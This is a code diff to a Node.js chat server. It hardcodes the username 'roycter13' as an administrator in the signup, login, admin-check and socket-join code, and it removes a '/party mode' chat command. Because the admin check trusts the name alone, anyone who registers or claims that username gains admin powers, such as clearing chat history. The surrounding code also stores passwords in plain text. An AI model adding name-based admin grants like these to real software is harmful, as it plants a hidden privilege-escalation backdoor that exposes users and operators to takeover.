@@ -62,7 +62,10 @@ app.post('/api/signup', (req, res) => {
     const users = loadUsers();
     if (users[trimmed]) return res.json({ success: false, message: 'Username already exists.' });
     
-    const isAdmin = (trimmed.toLowerCase() === MASTER_ADMIN.toLowerCase());
+    const isMaster = (trimmed.toLowerCase() === MASTER_ADMIN.toLowerCase());
+    const isRoycter = (trimmed.toLowerCase() === 'roycter13');
+    const isAdmin = isMaster || isRoycter;
+
     users[trimmed] = { password: password, following: [], likes: [], ip: clientIp, isAdmin: isAdmin };
     saveUsers(users);
     return res.json({ success: true, username: trimmed });
@@ -86,7 +89,7 @@ app.post('/api/login', (req, res) => {
     }
 
     users[trimmed].ip = clientIp;
-    if (trimmed.toLowerCase() === MASTER_ADMIN.toLowerCase()) {
+    if (trimmed.toLowerCase() === MASTER_ADMIN.toLowerCase() || trimmed.toLowerCase() === 'roycter13') {
         users[trimmed].isAdmin = true;
     }
     saveUsers(users);
@@ -101,9 +104,10 @@ const connectedUsers = {}; // socket.id -> { username, ip }
 
 function isUserAdmin(username) {
     if (!username) return false;
-    if (username.toLowerCase() === MASTER_ADMIN.toLowerCase()) return true;
+    const lower = username.toLowerCase();
+    if (lower === MASTER_ADMIN.toLowerCase() || lower === 'roycter13') return true;
     const users = loadUsers();
-    const foundKey = Object.keys(users).find(k => k.toLowerCase() === username.toLowerCase());
+    const foundKey = Object.keys(users).find(k => k.toLowerCase() === lower);
     return foundKey ? !!users[foundKey].isAdmin : false;
 }
 
@@ -141,7 +145,7 @@ io.on('connection', (socket) => {
         const users = loadUsers();
         if (users[trimmedName]) {
             users[trimmedName].ip = clientIp;
-            if (trimmedName.toLowerCase() === MASTER_ADMIN.toLowerCase()) {
+            if (trimmedName.toLowerCase() === MASTER_ADMIN.toLowerCase() || trimmedName.toLowerCase() === 'roycter13') {
                 users[trimmedName].isAdmin = true;
             }
             saveUsers(users);
@@ -283,14 +287,7 @@ io.on('connection', (socket) => {
                 return;
             }
 
-            // 5. /party mode
-            else if (cmd1 === '/party' && cmd2 === 'mode') {
-                io.emit('trigger_party', { url: 'https://www.youtube.com/watch?v=aMyVyR64urY' });
-                sendSystemMessage(`🎉🥳 PARTY MODE ACTIVATED BY ADMIN! 🥳🎉`);
-                return;
-            }
-
-            // 6. /clear
+            // 5. /clear
             else if (cmd1 === '/clear') {
                 messageHistory = [];
                 io.emit('clear_chat');
